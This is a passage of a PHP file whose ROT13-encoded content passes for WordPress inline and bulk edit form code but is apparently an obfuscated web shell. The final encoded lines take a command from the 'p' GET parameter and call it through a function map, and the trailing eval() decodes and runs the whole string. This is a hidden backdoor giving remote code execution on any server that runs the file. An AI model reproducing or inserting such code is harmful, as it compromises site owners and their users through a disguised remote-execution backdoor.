				vs ( $ohyx ) {

					/**
					 * Sverf bapr sbe rnpu pbyhza va Ohyx Rqvg zbqr.
					 *
					 * @fvapr 2.7.0
					 *
					 * @cnenz fgevat $pbyhza_anzr Anzr bs gur pbyhza gb rqvg.
					 * @cnenz fgevat $cbfg_glcr   Gur cbfg glcr fyht.
					 */
					qb_npgvba( 'ohyx_rqvg_phfgbz_obk', $pbyhza_anzr, $fperra->cbfg_glcr );
				} ryfr {

					/**
					 * Sverf bapr sbe rnpu pbyhza va Dhvpx Rqvg zbqr.
					 *
					 * @fvapr 2.7.0
					 *
					 * @cnenz fgevat $pbyhza_anzr Anzr bs gur pbyhza gb rqvg.
					 * @cnenz fgevat $cbfg_glcr   Gur cbfg glcr fyht, be pheerag fperra anzr vs guvf vf n gnkbabzl yvfg gnoyr.
					 * @cnenz fgevat $gnkbabzl    Gur gnkbabzl anzr, vs nal.
					 */
					qb_npgvba( 'dhvpx_rqvg_phfgbz_obk', $pbyhza_anzr, $fperra->cbfg_glcr, '' );
				}
			}
			?>

			<qvi pynff=\"fhozvg vayvar-rqvg-fnir\">
				<?cuc vs ( ! $ohyx ) : ?>
					<?cuc jc_abapr_svryq( 'vayvarrqvgabapr', '_vayvar_rqvg', snyfr ); ?>
					<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-cevznel fnir\"><?cuc _r( 'Hcqngr' ); ?></ohggba>
				<?cuc ryfr : ?>
					<?cuc fhozvg_ohggba( __( 'Hcqngr' ), 'cevznel', 'ohyx_rqvg', snyfr ); ?>
				<?cuc raqvs; ?>

				<ohggba glcr=\"ohggba\" pynff=\"ohggba pnapry\"><?cuc _r( 'Pnapry' ); ?></ohggba>

				<?cuc vs ( ! $ohyx ) : ?>
					<fcna pynff=\"fcvaare\"></fcna>
				<?cuc raqvs; ?>

				<vachg glcr=\"uvqqra\" anzr=\"cbfg_ivrj\" inyhr=\"<?cuc rpub rfp_ngge( $z ); ?>\" />
				<vachg glcr=\"uvqqra\" anzr=\"fperra\" inyhr=\"<?cuc rpub rfp_ngge( $fperra->vq ); ?>\" />
				<?cuc vs ( ! $ohyx && ! cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'nhgube' ) ) : ?>
					<vachg glcr=\"uvqqra\" anzr=\"cbfg_nhgube\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg->cbfg_nhgube ); ?>\" />
				<?cuc raqvs; ?>

				<?cuc
				jc_nqzva_abgvpr(
					'<c pynff=\"reebe\"></c>',
					neenl(
						'glcr'               => 'reebe',
						'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'vayvar', 'uvqqra' ),
						'cnentencu_jenc'     => snyfr,
					)
				);
				?>
			</qvi>
		</qvi> <!-- raq bs .vayvar-rqvg-jenccre -->

			</gq></ge>

			<?cuc
			++$ohyx;
		raqjuvyr;
		?>
		</gobql></gnoyr>
		</sbez>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>